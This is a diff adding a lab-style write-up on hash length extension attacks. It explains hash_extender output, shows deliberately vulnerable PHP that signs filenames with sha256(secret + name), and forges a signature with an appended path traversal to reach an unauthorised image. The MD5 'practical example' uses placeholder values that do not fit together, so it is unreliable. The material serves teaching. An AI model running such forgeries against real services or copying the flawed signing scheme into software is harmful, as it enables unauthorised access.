@@ -554,3 +554,97 @@ The arguments you probably want to give are (see above for more details):
 
 ```
 ![Hash Extender](hash_extender.png)
+
+- Interpretation of the output
+Type: md5  
+Indicates that the attack was carried out on an MD5 hash.
+
+Secret length: 8  
+The programme assumed that the secret key originally used was 8 bytes long.
+
+New signature: bb0a3976896846b4fd7e163a7de9e945  
+This is the new valid hash for the extended message. An attacker could use it as if it were legitimate, without knowing the secret key.
+
+New string:
+```
+757365723d74657374...2661646d696e3d74727565
+```
+This is the message in hexadecimal format.
+
+The first part corresponds to the original message ‘user=test’.
+
+Next, you can see the automatic padding added by SHA/MD5 to align the data to the block size.
+
+Finally, the appended string appears: ‘&admin=true’ (2661646d696e3d74727565 in hex).
+
+### Practical example
+
+- Original message: ‘user=test’
+
+- Original hash: 5d41402abc4b2a76b9719d911017c592
+
+- Extended message (conceptual): ‘user=test’ + padding + ‘&admin=true’
+
+- New valid hash: bb0a3976896846b4fd7e163a7de9e945
+
+A system that only validates the hash might accept the extended message as legitimate, even though the attacker never knew the secret key.
+
+
+### The vulnerable code
+The PHP code shown below uses an SHA-256 hash to sign the filenames of the vulnerable application. The purpose of this signature is to verify that only authorised files (product images) can be accessed, thereby preventing unauthorised access to them:
+```php
+require_once("secrets.php");
+
+function sign($str, $secret) {
+    return hash('sha256', $secret . $str);
+}
+
+// Retrieve and sanitize file and signature parameters
+$file = isset($_GET['file']) ? $_GET['file'] : '';
+$signature = isset($_GET['signature']) ? $_GET['signature'] : '';
+
+if ($file && $signature) {
+    // Validate the signature
+    if (sign($file, $SECRET) === $signature) {
+
+        // Sanitize the filename, force UTF-8 encoding, and remove malicious characters
+        $file = mb_convert_encoding($file, 'UTF-8', 'binary');
+        $file = preg_replace('/[^\w\/.]/', '', $file);
+
+        // Set the file path in the images folder
+        $filePath = __DIR__ . "/images/" . basename($file);
+
+        // Check if the file exists and if it matches a defined product
+        if (file_exists($filePath)) {
+            $product = $products[$file];
+						// Display product details
+```
+- Here's how the vulnerable code works:
+
+- The server generates a SHA-256 hash by signing the file name with a secret key.
+- It then validates the file and signature parameters from a GET request to ensure the request is authentic.
+- If the signature matches, the server retrieves and displays product details.
+
+
+### Objective
+The objective here is to append additional data (/../4.png) to the file parameter (e.g., "1.png") to access an unauthorized file while generating a valid SHA-256 signature for the modified file path.
+
+```bash
+~/Rooms/LengthExtensionAttacks/hash_extender# ./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html
+Type: sha256
+Secret length: 8
+New signature: a9f7878a39b10d0a9d3d1765d3e83dd34b0b0242fa7e1567f085a5a9c467337a
+New string: 1%2epng%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%2f%2e%2e%2f4%2epng
+
+Type: sm3
+Secret length: 8
+New signature: b3503f8697adb6906472c4115b8732ceed307217e19b808bdb94795c2021fca6
+New string: 1%2epng%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%2f%2e%2e%2f4%2epng
+
+```
+Note that in some cases, the secret length varies depending on the secret phrase used by the server. Hence, sometimes, it is important to brute force the signature by using an incrementing secret length.
+
+- With this new signature, we can send a forged request to access "4.png" instead of "1.png". The request might look like this:
+The server, trusting the signature, will validate the hash and grant access to "4.png" because the new signature matches the appended path:
+
+![URL bar with a crafted request exploiting a length extension attack. The URL displays the file parameter set to 1.png followed by padding bytes and the path traversal sequence /../4.png, along with a signature parameter containing a SHA-256 hash value. The page content shows a product image labeled Product 4 with the text Product 4 and a price of $999, demonstrating successful unauthorized access to file 4.png through the vulnerability](product_hash.png)
